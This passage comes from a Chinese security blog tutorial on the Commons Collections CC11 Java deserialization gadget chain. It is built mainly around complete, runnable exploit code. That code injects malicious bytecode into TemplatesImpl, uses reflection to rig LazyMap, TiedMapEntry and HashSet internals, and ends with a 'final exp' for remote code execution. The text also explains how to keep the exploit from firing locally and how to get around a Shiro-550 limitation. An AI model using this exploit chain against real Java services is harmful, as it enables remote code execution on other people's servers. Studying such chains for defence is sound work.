class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java186.png" alt=""></p>
+<p>至此，构建了cc6+cc2的链子。但实际上cc11的链子是不带Transformer 数组的<br>
+（因为CC11想要干的是不带Transformer数组的链子，其实就是为了规避Shiro-550反序列化时的一个问题：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。）</p>
+<h3 id="bu-dai-transformer-shu-zu-de-cc-11-lian-zi" id="不带-Transformer-数组的-CC11-链子">不带 Transformer 数组的 CC11 链子</h3>
+<p>LazyMap#get 的参数 key，会被传进transform()，实际上它可以扮演 ConstantTransformer 的角色————一个简单的对象传递者。</p>
+<p>我们 LazyMap.get(key) 直接调用 InvokerTransfomer.transform(key)，然后像CC2那样调用 TempalteImpl.newTransformer() 来完成后续调用。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//替换为如下代码</span></span><br><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>后续利用反射，调用InvokernewTransformer。</p>
+<p>修改后的exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC11Gai</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="comment">//调用TemplatesImpl的newTransformer()方法</span></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)); <span class="comment">//防止序列化调用，先改为一个无意义的</span></span><br><span class="line">        <span class="comment">//利用LazyMap的get()来触发transform()。TiedMapEntry类的getValue()调用LazyMap的get()方法</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, templates);</span><br><span class="line">        <span class="comment">// TiedMapget.getValue();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; HashMap1 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        HashMap1.put(TiedMapget,<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">        LazydecorateMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用修改值</span></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryField.set(LazydecorateMap, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(HashMap1);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java188.png" alt=""></p>
+<h3 id="zui-zhong-lian-zi-ru-kou-lei" id="最终链子-入口类">最终链子(入口类)</h3>
+<p>HashMap.put()之后的链子都梳理完毕了，但是我们还差入口类。</p>
+<p>看一下HashSet#readObject</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">    map.put(e, PRESENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>我们要控制e这个参数。让它put进去，然后执行后续的攻击链，而这里 e 是根据 s 反序列化得来的。</p>
+<p>我们查看对应序列化的方法 ，如果我们能控制 HashSet 的 map 属性中的 key 那么就能触发 RCE。</p>
+<p><img src="/imgss/java187.png" alt=""></p>
+<p>利用反射控制HashSet的属性。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">hashset.add(<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"><span class="comment">//这里必须通过反射设置key值为tiedmap，如果通过hashset.add(tiedmap)就会本地触发利用链(但不会执行)，并异常退出。</span></span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashset_map = (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node, TiedMapget);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>最后利用反射修改我们之前 InvokerTransformer 中的 iMethodName属性（这样是为了防止我们在生成 payload 的时候触发 RCE，在前面的几条链中也会这么操作，有的时候在本地触发 RCE 之后会导致数值改变然后在服务端就无法触发 RCE 了）</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field f3 = transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">f3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">f3.set(transformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>最终的exp：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC11Gai</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryField = aClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="comment">//调用TemplatesImpl的newTransformer()方法</span></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map LazydecorateMap = LazyMap.decorate(objectObjectHashMap, invokerTransformer);</span><br><span class="line">        <span class="comment">//利用LazyMap的get()来触发transform()。TiedMapEntry类的getValue()调用LazyMap的get()方法</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry TiedMapget = <span class="keyword">new</span> TiedMapEntry(LazydecorateMap, templates);</span><br><span class="line">        <span class="comment">// TiedMapget.getValue();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; HashMap1 = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        HashMap1.put(TiedMapget,&quot;bbbb&quot;);</span></span><br><span class="line"><span class="comment">//        LazydecorateMap.remove(templates);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //反射调用修改值</span></span><br><span class="line"><span class="comment">//        Class c = LazyMap.class;</span></span><br><span class="line"><span class="comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span></span><br><span class="line"><span class="comment">//        factoryField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        factoryField.set(LazydecorateMap, invokerTransformer);</span></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;zer0&quot;</span>); <span class="comment">//无意义，为了调用map.get进入到HashMap put</span></span><br><span class="line">        <span class="comment">//这里必须通过反射设置key值为tiedmap，如果通过hashset.add(TiedMapget)就会本地触发利用链(但不会执行)，并异常退出。</span></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) f.get(hashset);</span><br><span class="line">        <span class="comment">//操纵hashSet的Map 。public HashSet() &#123; map = new HashMap&lt;&gt;(); &#125;</span></span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(hashset_map);</span><br><span class="line">        <span class="comment">//操纵hashMap的table。if ((tab = table) == null || (n = tab.length) == 0)</span></span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, TiedMapget);</span><br><span class="line">        <span class="comment">//操纵HashMap的key，return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span></span><br><span class="line"></span><br><span class="line">        Field f3 = invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f3.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(hashset);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java189.png" alt=""></p>
+<p>读class加载恶意类这里，最后还可以利用javasist动态创建恶意字节码。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" rel="tag"># java安全系列</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc5/" rel="prev" title="'Java反序列化-cc5'">
+                  <i class="fa fa-chevron-left"></i> 'Java反序列化-cc5'
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
